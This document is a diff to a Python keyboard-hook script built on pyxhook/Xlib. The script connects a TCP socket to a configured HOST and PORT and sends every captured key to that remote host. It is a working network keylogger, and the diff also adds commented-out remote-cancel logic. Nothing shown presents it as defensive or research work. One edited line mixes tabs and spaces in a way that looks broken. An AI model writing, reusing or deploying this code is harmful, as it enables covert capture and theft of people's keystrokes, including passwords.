@@ -5,11 +5,7 @@ import sys
 import re
 import time
 import threading
-try:
-	import subprocess
-except:
-    import commands
-
+import subprocess
 from Xlib import X, XK, display
 from Xlib.ext import record
 from Xlib.protocol import rq
@@ -20,10 +16,6 @@ BUFSIZ = 4096
 client_sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 sock_addr = (HOST, int(PORT))
 
-try :
-    client_sock.connect(sock_addr)
-except:
-	pass
 
 class HookManager(threading.Thread):
     """ This is the main class. Instantiate it, and you can hand it KeyDown
@@ -334,8 +326,9 @@ class HookManager(threading.Thread):
     # chars rather than being the correct inverse of XK.string_to_keysym()
     def lookup_keysym(self, keysym):
         for name in dir(XK):
-            if name.startswith("XK_") and getattr(XK, name) == keysym:
-                return name.lstrip("XK_")
+            if name.startswith("XK_") and (getattr(XK, name) == keysym):
+		return name[3:]
+                #return name.lstrip("XK_")
         return "[{}]".format(keysym)
 
     def asciivalue(self, keysym):
@@ -443,6 +436,11 @@ class pyxhookkeyevent:
     def __str__(self):
         try:
             client_sock.send((self.Key).encode('utf-8'))
+#            self.data = client_sock.recv(1024)
+#            if not self.data:
+#                break
+#            if (self.data).decode('utf-8') == 'grave':
+#                hm.cancel()
         except:
         	pass
         #client_sock.send('\n'.encode('utf-8'))
@@ -451,7 +449,7 @@ class pyxhookkeyevent:
 #            'Window Name: {s.WindowName}',
 #            'Window\'s Process Name: {s.WindowProcName}',
             'Key Pressed: {s.Key}',
-#            'Ascii Value: {s.Ascii}',
+            'Ascii Value: {s.Ascii}',
 #            'KeyID: {s.KeyID}',
 #            'ScanCode: {s.ScanCode}',
 #            'MessageName: {s.MessageName}',
@@ -497,6 +495,11 @@ if __name__ == '__main__':
 #    hm.MouseAllButtonsUp = hm.printevent
 #    hm.MouseMovement = hm.printevent
     try:
+        try :
+            client_sock.connect(sock_addr)
+        except:
+            print("Not Connected")
+            pass
         hm.start()
         while True:
             time.sleep(0)
